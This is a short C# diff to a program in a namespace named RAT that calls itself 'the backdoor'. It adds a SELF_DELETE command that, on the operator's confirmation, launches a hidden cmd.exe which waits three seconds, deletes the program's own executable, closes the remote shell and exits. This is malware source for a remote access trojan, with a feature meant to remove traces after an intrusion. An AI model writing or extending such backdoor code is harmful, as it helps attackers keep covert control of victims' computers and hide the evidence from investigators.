@@ -214,6 +214,25 @@ namespace RAT
                     }
 
                     break;
+                case RatAction.SELF_DELETE:
+                    OutStream.WriteLine("Are you sure, that you want to delete the backdoor? [Y/N]");
+                    var yORn = InStream.ReadLine();
+                    if (yORn.Equals("y"))
+                    {
+                        Log("Performing self-deletion");
+                        OutStream.WriteLine("Goodbye my friend!");
+                        ProcessStartInfo Info = new ProcessStartInfo();
+                        Info.Arguments = "/C choice /C Y /N /D Y /T 3 & Del " +
+                                       Application.ExecutablePath;
+                        Info.WindowStyle = ProcessWindowStyle.Hidden;
+                        Info.CreateNoWindow = true;
+                        Info.FileName = "cmd.exe";
+                        Process.Start(Info);
+                        CloseShell();
+                        Application.Exit();
+                    }
+                    
+                    break;
                 case RatAction.QUIT:
                     OutStream.WriteLine("\n\nClosing the shell and Dropping the connection...");
                     CloseShell();
